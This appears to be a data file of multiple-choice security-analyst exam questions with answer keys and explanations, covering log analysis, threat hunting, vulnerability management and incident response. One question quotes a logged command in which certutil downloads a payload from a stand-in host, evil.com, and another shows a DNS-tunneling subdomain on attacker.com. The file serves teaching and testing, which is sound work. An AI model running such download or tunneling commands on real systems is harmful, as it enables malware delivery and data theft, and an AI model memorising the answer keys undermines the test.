{q:"Which report type helps executive leadership understand the organization's security posture relative to industry peers?",o:["Technical vulnerability scan report", "Benchmarking report — comparing the organization's metrics against industry standards and peer organizations", "Patch compliance report", "Incident timeline report"],a:1,d:4,e:"Benchmarking provides context for security posture. 'Our MTTR is 45 days' is meaningless without context. 'Our 45-day MTTR is 3x the industry median of 15 days for critical vulnerabilities' enables informed investment decisions. CIS Controls, NIST CSF maturity tiers, and industry-specific benchmarking frameworks provide comparison points."},
{q:"An analyst must document the chain of custody for digital evidence collected during an incident. This documentation PRIMARILY serves to:",o:["Speed up the investigation", "Prove in legal proceedings that evidence was not tampered with from collection through presentation", "Satisfy audit requirements", "Organize the evidence collection process"],a:1,d:4,e:"Chain of custody proves legal admissibility. Every person who handled evidence, every transfer, every analysis step must be documented. Cryptographic hashing proves integrity. If evidence was not properly documented, defense attorneys can successfully argue it was contaminated or altered — making it inadmissible. For any incident that may result in prosecution, CoC is critical from the first moment of collection."},
{q:"Which security metric measures how quickly an organization's security team detects an ongoing intrusion?",o:["Patch coverage rate", "MTTD — Mean Time to Detect, measuring the gap between initial compromise and security team awareness", "Number of alerts processed", "Vulnerability count"],a:1,d:4,e:"MTTD measures detection speed — the average time from when an attacker first gained access to when the security team became aware. Global average MTTD has historically been 200+ days for advanced threats. Reducing MTTD directly limits attacker dwell time and breach impact. MTTD is tracked alongside MTTR (time to respond/contain) as the core IR effectiveness metrics."},
{q:"A company must notify regulators of a data breach. The FIRST step in preparing the notification is:",o:["Writing the notification letter", "Consulting legal counsel to determine notification obligations, timelines, and content requirements based on applicable regulations", "Notifying affected customers", "Holding a press conference"],a:1,d:4,e:"Legal counsel determines: which regulations apply (GDPR, HIPAA, state laws, sector-specific), what the notification must contain, to whom notification is required (regulators, affected individuals), and deadlines (GDPR: 72 hours to supervisory authority). Writing the notification before understanding legal requirements risks incomplete or non-compliant notification, creating additional legal exposure."},
{q:"Which vulnerability report format is MOST appropriate for communicating findings to developers who will fix the issues?",o:["Executive summary with risk ratings only", "Technical report with reproduction steps, vulnerable code snippets, and recommended code-level remediation — giving developers what they need to fix it", "Compliance checklist", "CVE reference list only"],a:1,d:4,e:"Developers need actionable technical detail: exact location of the vulnerability, reproduction steps, root cause analysis, and specific remediation guidance (parameterize this query, validate this input, etc.). Without this, developers spend time independently finding what was already found during assessment. Technical reports accelerate developer remediation."},
{q:"An analyst must communicate to management that the organization's most critical vulnerability cannot be patched for 30 days due to application dependencies. The COMMUNICATION should include:",o:["Only the vulnerability technical details", "The business risk of the delay, compensating controls implemented to reduce exposure during the window, and approval request from the risk owner", "Only that the patch is delayed", "Only the compensating controls without mentioning the delay"],a:1,d:4,e:"Risk communication must include: what the risk is (business terms), why it exists (dependency issue), what's being done to mitigate it during the window (compensating controls), and what decision is needed (risk acceptance approval from the appropriate authority). This gives management the information needed to make an informed risk decision."},
{q:"Which Windows event ID indicates a user account was successfully logged on?",o:["4624", "4625", "4648", "4720"],a:0,d:1,e:"Event ID 4624 is a successful logon. 4625 is a failed logon. 4648 is logon using explicit credentials (e.g., runas). 4720 is user account creation. Monitoring 4624 with unusual source IPs, times, or logon types (Type 3 = network) is foundational for detecting credential-based attacks."},
{q:"A SOC analyst sees a spike in Event ID 4625 (failed logon) across 50 accounts from one IP in 5 minutes, followed by a single 4624 (success). This sequence indicates:",o:["Normal user error", "A successful password spray attack — spray failed on most accounts but succeeded on one", "A brute force on one account", "Normal network authentication"],a:1,d:1,e:"Password spray: many accounts, few attempts each. The success after many failures across different accounts confirms one credential worked. Immediate response: disable the compromised account, investigate what the attacker accessed, reset the password, and analyze which account was hit — it likely had a weak or common password."},
{q:"Which log analysis technique identifies statistical outliers by comparing current patterns to historical baselines?",o:["Signature matching — matching against known bad patterns", "Anomaly detection — flagging deviations from established behavioral baselines", "Keyword searching", "Log aggregation"],a:1,d:1,e:"Anomaly detection is baseline-driven. The system learns normal patterns (typical login times, typical data volumes, typical process trees) and flags statistical deviations. This catches novel attacks that have no signatures. Limitation: high false positive rate during initial baselining period."},
{q:"An analyst is investigating a potential insider threat. Which data source BEST shows what files a user copied to external media?",o:["Authentication logs", "DLP solution logs combined with USB connection artifacts (USBSTOR registry, Windows Event Log 2003/2004/2005)", "Firewall logs", "Email logs"],a:1,d:1,e:"DLP (Data Loss Prevention) solutions monitor and log data movement including USB transfers. Windows events 2003/2004/2005 in the Microsoft-Windows-DriverFrameworks-UserMode log track USB device connection and disconnection. Combining DLP with USB artifacts builds a complete picture of what was transferred to which device at what time."},
{q:"Which threat hunting technique starts with a specific hypothesis about attacker behavior rather than searching broadly?",o:["Reactive hunting — responding to alerts", "Hypothesis-driven hunting — testing specific theories about attacker TTPs based on threat intelligence", "Machine learning-based hunting", "Signature scanning"],a:1,d:1,e:"Hypothesis-driven hunting starts with a specific theory: 'Attackers targeting our industry use WMI for persistence — let me hunt for WMI event subscriptions.' This focused approach is more efficient than broad hunting and leverages threat intelligence about relevant threat actors and their TTPs."},
{q:"A process is observed making a DNS query for a domain that was registered 2 days ago and has never been queried by this organization. The domain resolves to an IP in a bulletproof hosting network. This is MOST consistent with:",o:["Legitimate new SaaS application usage", "C2 infrastructure — attackers register fresh domains to avoid blocklists", "CDN traffic", "Update server traffic"],a:1,d:1,e:"Attackers register new domains specifically to avoid threat intelligence blocklists that only catch known-bad domains. Domain age combined with bulletproof hosting (hosting providers that ignore abuse complaints) and unexpected resolution from an internal host is a high-confidence C2 indicator. Threat hunting should pivot from this domain to the connecting process."},
{q:"Which artifact persists on Windows systems after an application is uninstalled and records historical software execution?",o:["Windows registry Run keys", "Shimcache/AppCompatCache — records metadata about executed files even after deletion", "Prefetch files only", "Event logs only"],a:1,d:1,e:"Shimcache (Application Compatibility Cache) records file path, size, and last modification time for executables that were run. Critically, entries persist even after the file is deleted, providing forensic evidence of past execution. Analysts examine shimcache to prove that malware was run even after cleanup. Located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache."},
{q:"A new alert rule fires 800 times in 24 hours but only 2 are true positives. The analyst should:",o:["Accept the noise as necessary", "Tune the rule — add exclusions for known-good sources and increase threshold specificity to reduce false positives", "Disable the rule", "Escalate all 800 to incident status"],a:1,d:1,e:"A 0.25% true positive rate makes the rule operationally useless — analysts will start ignoring it, creating alert fatigue. Rule tuning: add whitelist conditions (known IPs, known process paths), increase threshold (require 10 events instead of 1), add correlated conditions (require failed auth + lateral movement + suspicious process simultaneously). Quality over quantity."},
{q:"Which network traffic characteristic is MOST useful for identifying encrypted C2 traffic that mimics legitimate HTTPS?",o:["Packet size", "JA3/JA3S TLS fingerprinting — identifies TLS client/server implementations regardless of certificate validity", "Port numbers", "Protocol version"],a:1,d:1,e:"JA3 hashes TLS client hello parameters (cipher suites, extensions, elliptic curves) to create a fingerprint of the TLS implementation. Many malware families have distinctive JA3 fingerprints that persist even when they rotate domains and IPs. JA3S fingerprints the server response. Matching JA3 against known-bad fingerprints catches C2 traffic disguised as legitimate HTTPS."},
{q:"Which technique allows malware to execute code without writing any files to disk?",o:["Registry persistence", "Fileless malware — executing code in memory (PowerShell, WMI, or reflective DLL injection) without disk artifacts", "Boot sector infection", "Service installation"],a:1,d:1,e:"Fileless malware lives entirely in memory, using built-in system tools (PowerShell, WMI, .NET) or injecting code into legitimate processes. Traditional AV that scans files cannot detect it. EDR solutions with memory scanning, behavior monitoring, and script-block logging (PowerShell 5.0+) are required. Memory forensics (RAM dump analysis) is the primary forensic technique."},
{q:"An analyst notices base64-encoded PowerShell commands in event logs. This is significant because:",o:["Base64 is a security feature of PowerShell", "Base64 encoding is commonly used to obfuscate malicious PowerShell — hiding payloads from signature detection", "It indicates a software update", "Base64 indicates encrypted communications"],a:1,d:1,e:"Attackers encode PowerShell commands to evade detection: 'powershell.exe -EncodedCommand <base64>'. The encoded payload might download malware, disable defenses, or execute further stages. PowerShell Script Block Logging (Event ID 4104) decodes and logs the actual commands executed, defeating this obfuscation. Analysts should decode and analyze any encoded PowerShell."},
{q:"Which kill chain phase does a spear-phishing email represent?",o:["Weaponization", "Delivery — the mechanism of delivering the weaponized payload to the target", "Exploitation", "Installation"],a:1,d:1,e:"Lockheed Martin Kill Chain: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. Spear-phishing is the Delivery phase — the mechanism for getting the weaponized payload (malicious attachment or link) to the target. Understanding which phase an indicator belongs to helps analysts understand how far into an attack the adversary has progressed."},
{q:"A web proxy log shows hundreds of HTTP requests with identical User-Agent strings to a single external IP at regular 30-second intervals. This MOST likely indicates:",o:["Normal web browsing", "Malware beaconing — malware checking in with C2 at regular intervals using a consistent User-Agent", "A software update process", "A load balancer health check"],a:1,d:1,e:"Regular-interval requests from a single host to a single external IP with a programmatic (non-browser) User-Agent is a classic beaconing pattern. Legitimate browser traffic is irregular in timing. The single-IP destination rules out CDN/distributed services. 30-second regularity is consistent with malware poll intervals. Investigate the host immediately."},
{q:"Which MITRE ATT&CK tactic describes actions taken by an attacker after initial access to maintain presence in the environment?",o:["Initial Access", "Persistence — techniques ensuring the attacker can maintain access even after reboots or credential changes", "Privilege Escalation", "Discovery"],a:1,d:1,e:"ATT&CK Persistence tactic (TA0003) includes: Registry Run Keys, Scheduled Tasks, Services, WMI event subscriptions, Boot/Logon Autostart, Browser Extensions, and Account Manipulation. After initial compromise, establishing persistence is one of the attacker's first priorities. Hunting for new persistence mechanisms is a high-value detection opportunity."},
{q:"Which data source provides the BEST visibility into lateral movement using Windows Remote Management (WinRM)?",o:["Network flow logs showing port 5985/5986 connections", "Windows Event logs (4624 type 3/10, PowerShell remoting events) combined with WinRM service logs", "Firewall ACL logs", "DNS query logs"],a:1,d:1,e:"WinRM lateral movement: Windows Event 4624 Logon Type 3 (network logon) on the destination, PowerShell remoting events (Event ID 4103/4104), and WinRM service events on both source and destination. Network flow logs show 5985 connections. Correlating these sources confirms which user authenticated from which source to which destination — the full lateral movement picture."},
{q:"An endpoint has a process named 'explorer.exe' running from 'C:\\Users\\Public\\' with PPID of 4 (System). This is suspicious because:",o:["Explorer always runs from Public", "Legitimate explorer.exe runs from C:\\Windows\\ and is spawned by userinit.exe, not System", "Explorer should run as PPID 4", "This is normal remote session behavior"],a:1,d:1,e:"Masquerading (T1036): attackers copy malware to common paths and name it after legitimate processes. Legitimate explorer.exe: path is C:\\Windows\\explorer.exe, parent process is userinit.exe or winlogon.exe. PPID of 4 (System) is abnormal. Path in C:\\Users\\Public\\ is abnormal. Both anomalies together confirm this is malware, not explorer."},
{q:"Which technique does an attacker use to extract password hashes from memory on a Windows system?",o:["Keylogging", "LSASS memory dumping — using tools like Mimikatz to extract credentials from lsass.exe process memory", "Registry key theft", "Network sniffing"],a:1,d:1,e:"LSASS (Local Security Authority Subsystem Service) stores credential material in memory including NTLM hashes and Kerberos tickets. Mimikatz and similar tools dump LSASS memory to extract these credentials. Detections: Event ID 4656 (handle request to lsass), Event ID 10 in Sysmon (process access to lsass), EDR alerts on credential dumping behavior. Windows Credential Guard moves secrets to a protected VM, preventing this."},
{q:"Which DNS query type is used for command and control exfiltration where data is hidden in subdomain labels?",o:["A record queries", "TXT record queries with base64 data in unusually long subdomain labels — a DNS tunneling indicator", "MX record queries", "PTR record queries"],a:1,d:1,e:"DNS tunneling encodes data in DNS query labels: 'ZGF0YXRvZXhmaWx0cmF0ZQ.attacker.com'. The data-to-exfiltrate becomes the subdomain. The attacker's DNS server receives the queries and decodes the data. Indicators: long subdomain labels (>50 chars), high query frequency, TXT responses larger than normal, data patterns in subdomains. Tools like dnscat2 and iodine implement DNS tunneling."},
{q:"A threat intelligence report indicates a threat actor uses a custom Python backdoor that communicates over TCP 443 but does NOT use TLS. How would an analyst detect this?",o:["Block all port 443 traffic", "Inspect traffic patterns — legitimate HTTPS starts with a TLS ClientHello; raw TCP on 443 without TLS negotiation is anomalous", "Only check firewall logs", "Use port-based blocking only"],a:1,d:1,e:"Content inspection vs port inspection: firewalls see port 443 and assume HTTPS. An analyst examining packet captures or IDS signatures can verify whether actual TLS handshake occurs. Plain TCP on port 443 without TLS negotiation is highly anomalous — all legitimate HTTPS traffic starts with TLS ClientHello. This protocol anomaly is detectable by deep packet inspection or network monitoring tools."},
{q:"Which SIEM correlation rule would MOST effectively detect a brute force attack followed by account compromise?",o:["Alert on any failed login", "Correlate: >20 failed logins from one source to one account within 5 minutes, followed by a successful login from the same source within 10 minutes", "Alert on successful logins only", "Alert on all authentication events"],a:1,d:1,e:"The correlation rule combines two events: the attack pattern (many failures) with the success indicator (compromise). Simple rules alert on either event alone generating noise. Correlated rules require both conditions in sequence, creating high-fidelity alerts with minimal false positives. The time window (success within 10 min of the spray) establishes causal relationship."},
{q:"Which tool would an analyst use to analyze network traffic captured in a PCAP file?",o:["Nessus", "Wireshark — the industry-standard packet analysis tool for dissecting network protocols", "Metasploit", "Nmap"],a:1,d:1,e:"Wireshark decodes network protocols from raw PCAP captures, displaying packet fields at every OSI layer. Analysts use it to: reconstruct sessions (Follow TCP Stream), export transferred files (Export Objects), analyze protocol details, identify anomalies, and extract IOCs. tcpdump creates PCAPs from the command line; Wireshark analyzes them. Both are fundamental SOC analyst tools."},
{q:"Which type of threat actor is MOST likely to use zero-day exploits and custom malware while maintaining persistent access for months without detection?",o:["Script kiddie", "APT (Advanced Persistent Threat) — nation-state or state-sponsored actors with advanced capabilities and long-term objectives", "Hacktivist", "Opportunistic criminal"],a:1,d:1,e:"APTs combine: zero-day exploits (expensive, custom), custom malware (not in signature databases), patient long-term access (months to years), specific high-value targets, and significant resources. They prioritize stealth over speed. Nation-state APTs targeting government and critical infrastructure exemplify this. Their long dwell time (often 200+ days before detection) demonstrates their evasion capability."},
{q:"An analyst reviewing Sysmon logs sees Event ID 1 (Process Create) with: ParentImage: C:\\Windows\\System32\\wscript.exe, Image: C:\\Windows\\System32\\cmd.exe, CommandLine: 'cmd.exe /c certutil -urlcache -f http://evil.com/payload.exe %TEMP%\\payload.exe'. What happened?",o:["Normal Windows scripting", "A script (VBScript/JScript) launched cmd.exe which used certutil to download malware — a living-off-the-land attack", "A software installation", "Windows update activity"],a:1,d:1,e:"The process chain: wscript.exe (script interpreter) → cmd.exe → certutil (download malware). This is a classic LOTL attack: wscript runs a malicious script, cmd provides shell access, certutil (legitimate Windows tool) downloads the payload. No malicious binaries are used until the final download. Sysmon Event ID 1 with parent-child process tracking is essential for detecting this chain."},
{q:"Which security operations function ensures that threat detection rules remain current as threats evolve?",o:["Compliance auditing", "Detection engineering — continuously developing, testing, and maintaining detection content aligned with current threats", "Vulnerability scanning", "Asset inventory management"],a:1,d:1,e:"Detection engineering is an ongoing discipline: new attack techniques emerge constantly, existing rules generate false positives, and environments change. Detection engineers translate threat intelligence into SIEM/EDR rules, test them with simulated attacks, measure their effectiveness, and retire obsolete rules. Without continuous maintenance, detection capability degrades relative to evolving threats."},
{q:"A host suddenly begins resolving 50-100 different unique domain names per minute, most of which fail to resolve (NXDOMAIN). This indicates:",o:["Normal antivirus update behavior", "Domain Generation Algorithm (DGA) activity — malware generating random domains to find its C2 server", "DNS server failure", "Normal web browsing"],a:1,d:1,e:"DGA malware generates pseudo-random domain names and tries to contact each until one resolves to the C2 server. The attacker pre-registers just one of the generated domains. The flood of NXDOMAIN responses for random-looking domains is the signature. Tools like DGArchive and CISCO's DGA detection can identify DGA patterns. Once identified, analysts can predict future domains and preemptively block or sinkhole them."},
{q:"Which CVSS v3 metric describes how easily an attacker can exploit the vulnerability from a network perspective?",o:["Attack Complexity (AC)", "Attack Vector (AV) — Network means exploitable remotely, Local means requires physical/local access", "Privileges Required (PR)", "User Interaction (UI)"],a:1,d:2,e:"Attack Vector (AV) in CVSS v3: Network (N) = exploitable remotely over internet (highest severity), Adjacent (A) = requires same local network, Local (L) = requires local access, Physical (P) = requires physical interaction. Network-vectored vulnerabilities are most critical — they're reachable by every attacker on the internet without any access prerequisites."},
{q:"An organization uses a container platform. Which vulnerability management challenge is UNIQUE to containerized environments?",o:["Containers don't have vulnerabilities", "Container images are immutable but may be built from vulnerable base images — vulnerabilities spread to all containers using that image", "Container vulnerabilities cannot be patched", "Container scanning is impossible"],a:1,d:2,e:"Container image vulnerabilities propagate instantly — if the base image (e.g., Ubuntu:20.04) has a vulnerability, ALL containers built from it inherit it. Traditional agent-based scanners can't run inside containers. Container-specific scanning (Trivy, Clair, Anchore) scans image layers before deployment. Shift-left scanning in CI/CD pipelines catches vulnerabilities before images reach production."},
{q:"CISA's Known Exploited Vulnerabilities (KEV) catalog is MOST valuable for vulnerability prioritization because:",o:["It lists all CVEs", "It identifies vulnerabilities with confirmed active exploitation in the wild — the highest-priority remediation targets", "It provides CVSS scores", "It lists vendor patches"],a:1,d:2,e:"CISA KEV contains only vulnerabilities with confirmed real-world exploitation. Being on KEV means attackers are actively using this vulnerability right now against real organizations. CISA mandates federal agencies patch KEV entries within 2-3 weeks. Private organizations should treat KEV as highest-priority regardless of CVSS score. A CVSS 7.0 on KEV is higher priority than a CVSS 9.8 with no known exploitation."},
{q:"A vulnerability scan identifies a critical SQL injection flaw in a legacy application that cannot be patched for 6 months. The BEST compensating control is:",o:["Accept the risk without controls", "Deploy a WAF with SQL injection rules, restrict access to the application, and increase monitoring — while documenting the exception", "Ignore until patch is available", "Shut down the application"],a:1,d:2,e:"When patching is impossible, compensating controls reduce risk during the window: WAF filters SQL injection attempts at the network layer, access restrictions limit who can reach the vulnerable application, monitoring detects exploitation attempts. All of this is documented in a formal risk exception with owner sign-off and a remediation timeline. The compensating controls must be as effective as patching would be."},
{q:"Which vulnerability management process converts raw scanner output into a prioritized remediation plan?",o:["Scanning", "Analysis and prioritization — reviewing findings, removing false positives, adding context, and ordering by risk", "Reporting", "Patch deployment"],a:1,d:2,e:"Raw scanner output is not a remediation plan. Analysis adds: false positive removal (confirmed non-issues), asset context (production vs. dev), exploitability assessment (KEV? public PoC?), business impact, and compensating controls already in place. The output is an ordered, actionable list that the remediation team can execute without further triage."},
{q:"A security team uses EPSS (Exploit Prediction Scoring System) alongside CVSS. EPSS provides:",o:["A replacement for CVSS", "Probability that a vulnerability will be exploited in the next 30 days — helping prioritize based on actual exploitation likelihood", "Severity of the vulnerability if exploited", "Vendor patch priority"],a:1,d:2,e:"EPSS (maintained by FIRST) uses machine learning to predict the probability a CVE will be exploited within 30 days, based on factors like public exploit code availability, attacker interest, and historical patterns. Combining CVSS (technical severity) with EPSS (exploitation likelihood) creates better risk-based prioritization than CVSS alone. A high-EPSS/medium-CVSS vulnerability may need patching before a low-EPSS/critical-CVSS one."},
{q:"Which scanning approach is MOST effective for identifying vulnerabilities in web applications that aren't found by network scanners?",o:["Network vulnerability scanner", "DAST (Dynamic Application Security Testing) — testing running web applications by sending crafted inputs", "Host-based scanner", "Port scanner only"],a:1,d:2,e:"DAST (e.g., OWASP ZAP, Burp Suite) tests web applications by interacting with them as an attacker would: sending malicious inputs, manipulating parameters, testing authentication flows. Network scanners see what ports/services are open; DAST finds application-layer issues (SQLi, XSS, SSRF, broken authentication) that only emerge through application interaction. SAST analyzes source code; DAST tests running applications."},
{q:"An analyst discovers an S3 bucket containing customer PII is publicly accessible. This is classified as which type of vulnerability?",o:["Network vulnerability", "Cloud misconfiguration — a configuration error rather than a software flaw", "Application vulnerability", "Zero-day"],a:1,d:2,e:"Cloud misconfigurations are the leading cause of cloud data breaches. S3 public access, overpermissive IAM policies, unencrypted storage, and exposed management interfaces are misconfigurations, not software vulnerabilities — there's no CVE, no patch. Remediation is configuration correction (enable Block Public Access, review bucket policy). CSPM tools continuously detect these misconfigurations."},
{q:"A vulnerability was discovered in an open-source library used by 200 different applications in the organization. This is BEST described as:",o:["An isolated application vulnerability", "A software supply chain vulnerability — one vulnerable dependency affects all applications using it", "A network vulnerability", "A configuration vulnerability"],a:1,d:2,e:"Software supply chain vulnerabilities (like Log4Shell in Log4j) cascade across every application using the vulnerable dependency. Organizations often don't know which apps use which libraries — software composition analysis (SCA) tools map these dependencies. The challenge: 200 separate remediation efforts each requiring their own testing and deployment cycle."},
{q:"Which vulnerability management metric measures the percentage of discovered vulnerabilities that have been remediated within the SLA?",o:["Vulnerability count", "Patch compliance rate / SLA adherence rate — measuring remediation effectiveness against defined timelines", "MTTR", "CVE coverage"],a:1,d:2,e:"SLA adherence rate measures whether the vulnerability management program meets its own commitments: critical vulnerabilities patched within 7 days, high within 30 days, etc. This metric demonstrates operational effectiveness to stakeholders and identifies bottlenecks (is IT missing SLAs for specific asset types?). Low SLA adherence indicates process problems requiring remediation, not just more scanning."},
{q:"Which technology provides continuous, real-time vulnerability status rather than point-in-time scan snapshots?",o:["Annual vulnerability assessment", "Continuous vulnerability management using agent-based scanning and CSPM — providing always-current visibility", "Quarterly penetration testing", "Monthly scanning"],a:1,d:2,e:"Agent-based scanners (Tenable Nessus Agent, Qualys Cloud Agent) continuously monitor endpoint state and report changes in real time. CSPM continuously monitors cloud environments. This eliminates the 'scan gap' where vulnerabilities are introduced between scans and remain invisible for weeks. Continuous visibility is especially important in dynamic cloud environments where infrastructure changes constantly."},
{q:"An application has a buffer overflow vulnerability. The FIRST remediation step should be:",o:["Deploy IPS signatures", "Apply the vendor patch — fixing the root cause in the code", "Enable ASLR", "Add a WAF"],a:1,d:2,e:"Code-level fixes are always the primary remediation. Vendor patches fix the vulnerable code, eliminating the root cause. ASLR, DEP, and IPS signatures are compensating controls that make exploitation harder but don't fix the underlying vulnerability. A sophisticated attacker may bypass ASLR or craft exploits that evade IPS signatures; the patch eliminates the possibility entirely."},
{q:"Which attack surface management activity discovers internet-exposed assets that the security team didn't know about?",o:["Internal vulnerability scanning", "External attack surface management (EASM) — continuously discovering and monitoring internet-facing assets", "Compliance auditing", "Penetration testing"],a:1,d:2,e:"EASM discovers shadow IT, forgotten assets, and subsidiary infrastructure that internal teams may not know is exposed. Attackers perform this same reconnaissance — EASM gives defenders an attacker-eye view of their exposure. Discovered assets are then assessed for vulnerabilities and either remediated or decommissioned. This is increasingly important as cloud makes it easy to accidentally expose resources."},
{q:"A vendor releases a security advisory for a critical vulnerability but has not yet released a patch. The organization should:",o:["Wait for the patch", "Apply vendor-recommended mitigations immediately (e.g., disable the feature, restrict access), increase monitoring, and apply the patch as soon as it's available", "Accept the risk and do nothing", "Completely shut down the affected system"],a:1,d:2,e:"Vendor advisories often include temporary mitigations even before patches are available: disabling vulnerable features, restricting access to trusted IPs, adding authentication requirements, or configuration changes. These reduce attack surface during the patch gap. Monitoring for exploitation attempts should also increase. The formal patch should be applied as soon as it's tested and available."},
{q:"Which document defines the maximum allowable time between vulnerability scans for PCI DSS compliance?",o:["ISO 27001", "PCI DSS Requirement 11.3 — requires internal vulnerability scanning at least quarterly and after network changes", "NIST 800-53", "SOC 2"],a:1,d:2,e:"PCI DSS Requirement 11.3 mandates: internal vulnerability scans at least quarterly (and after significant changes), external scans quarterly by an Approved Scanning Vendor (ASV). After a failed scan, rescan until passing. This is one of the most prescriptive vulnerability scanning requirements in any compliance framework. Missing quarterly scans is a PCI DSS finding."},
{q:"An analyst discovers a vulnerability has a CVSS 3.1 base score of 6.5 but has been modified with a temporal score of 4.2. The temporal reduction reflects:",o:["A change in the vulnerability itself", "Availability of official vendor mitigations or patches that reduce real-world risk — temporal metrics adjust base scores based on current exploitation factors", "A change in the target environment", "A lower CVE number"],a:1,d:2,e:"CVSS temporal metrics adjust the base score for current real-world factors: Exploit Code Maturity (is there working exploit code?), Remediation Level (official patch, workaround, or nothing?), and Report Confidence (confirmed or unconfirmed?). An official patch available (Remediation Level = Official Fix) reduces the temporal score significantly because the risk can be eliminated by patching."},
{q:"Which vulnerability affects virtually all applications using a specific version of a shared library and requires coordinated response across many systems?",o:["Local privilege escalation", "Transitive/dependency vulnerability — a flaw in a widely-used library that affects all software depending on it", "Web application XSS", "Network protocol vulnerability"],a:1,d:2,e:"Transitive vulnerabilities in widely-used libraries (OpenSSL, Log4j, Spring Framework) require coordinated response. Every application using the affected library must be inventoried, updated, and tested separately. SCA tools (Snyk, Black Duck, OWASP Dependency Check) identify these dependencies. The response challenge is organizational: getting 50+ application teams to prioritize patching simultaneously."},
{q:"What is the PRIMARY benefit of integrating vulnerability management with the change management process?",o:["Faster scanning", "Ensuring new vulnerabilities introduced by changes are immediately scanned and that high-risk changes require security review", "Automatic patching", "Compliance reporting"],a:1,d:2,e:"Change management integration prevents 'scan gap' — when a change introduces a vulnerability, it's detected immediately because the change triggers a rescan. Security review of high-risk changes (firewall rule additions, new internet-facing services) prevents vulnerabilities from being introduced. Patching as part of change management ensures changes don't re-introduce patched vulnerabilities."},
{q:"An organization discovers a critical vulnerability in an OT/ICS system that controls physical processes. Patching immediately may cause system downtime. The BEST approach is:",o:["Patch immediately regardless of impact", "Coordinate with OT engineers to schedule patching during a planned maintenance window, apply compensating controls immediately, and monitor closely", "Accept the risk indefinitely", "Shut down the OT system"],a:1,d:2,e:"OT/ICS systems require special consideration — unplanned downtime can affect physical processes, safety, or production. Compensating controls (network isolation, additional monitoring, access restrictions) reduce risk during the patch window. Coordinated patching with OT engineers during planned maintenance minimizes business impact while addressing the vulnerability. Never patch OT systems without OT team coordination."},
{q:"Which metric indicates the total potential financial impact of a vulnerability if successfully exploited?",o:["CVSS score", "Business impact analysis combining asset value, data sensitivity, regulatory exposure, and operational disruption — the 'so what if exploited?' calculation", "Vulnerability age", "EPSS score"],a:1,d:2,e:"Business impact quantifies what actually matters: if this vulnerability is exploited, what does it cost? Factors: data breach cost (records × per-record cost), regulatory fines (GDPR, HIPAA), operational disruption (downtime × revenue/hour), remediation costs, reputational damage. A CVSS 9.8 on a test server with no sensitive data has lower business impact than a CVSS 7.0 on the payment processing system."},
{q:"Which NIST SP 800-61 incident response phase involves activities to reduce risk and improve defenses after an incident?",o:["Detection and Analysis", "Containment, Eradication, and Recovery", "Post-Incident Activity — lessons learned, policy updates, and control improvements", "Preparation"],a:2,d:3,e:"NIST SP 800-61 IR phases: Preparation → Detection and Analysis → Containment, Eradication, and Recovery → Post-Incident Activity. Post-incident activity includes: lessons-learned meetings, updating IR plans, improving detection capabilities, implementing missing controls, and reporting to leadership. This phase converts the incident into security improvements that prevent recurrence."},
{q:"An analyst identifies that an attacker used Pass-the-Hash to authenticate as a domain admin. The IMMEDIATE containment action is:",o:["Run antivirus scans", "Disable the compromised domain admin account, invalidate all its active sessions (including Kerberos tickets), and rotate the KRBTGT account password", "Reimage all servers", "Notify all users"],a:1,d:3,e:"Pass-the-Hash uses NTLM hashes for authentication — the attacker doesn't need the plaintext password. Containment: disable the account (stops new authentications), invalidate active tokens, and rotate KRBTGT (invalidates all existing Kerberos tickets, forcing re-authentication). KRBTGT rotation must be done twice to fully invalidate old tickets. This is urgent because domain admin access means complete domain compromise."},
{q:"Which order correctly represents the Lockheed Martin Kill Chain?",o:["Delivery → Reconnaissance → Weaponization → Installation → Exploitation", "Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives", "Exploitation → Delivery → Reconnaissance → C2 → Installation", "Installation → Exploitation → Delivery → Weaponization → Reconnaissance"],a:1,d:3,e:"Kill Chain (Lockheed Martin, 2011): 1.Reconnaissance, 2.Weaponization, 3.Delivery, 4.Exploitation, 5.Installation, 6.Command & Control, 7.Actions on Objectives. Each phase represents an opportunity to detect and stop the attack. Earlier phase interdiction (blocking delivery) is more effective than later phase interdiction (detecting actions on objectives after data is already stolen)."},
{q:"During malware analysis, an analyst executes suspicious code in an isolated virtual machine. This analysis technique is called:",o:["Static analysis — examining code without running it", "Dynamic analysis / sandboxing — executing malware in a controlled environment to observe behavior", "Fuzzing", "Reverse engineering"],a:1,d:3,e:"Dynamic analysis executes malware in a sandbox (isolated VM with monitoring tools) to observe: files created/modified, registry changes, network connections made, processes spawned, and API calls. This reveals actual malware behavior rather than attempting to infer it from code analysis. Cuckoo Sandbox, Any.run, and Joe Sandbox automate this process. The tradeoff: some malware detects VMs and behaves differently."},
